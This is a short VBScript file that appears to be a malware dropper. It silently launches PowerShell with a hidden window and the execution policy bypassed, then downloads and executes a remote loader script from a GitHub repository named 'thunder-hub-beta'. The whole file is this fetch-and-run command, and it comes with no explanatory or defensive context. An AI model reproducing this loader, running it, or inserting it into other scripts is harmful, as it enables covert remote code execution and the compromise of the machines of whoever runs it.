Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kotoedoff/thunder-hub-beta/main/loader.ps1'))""", 0, False
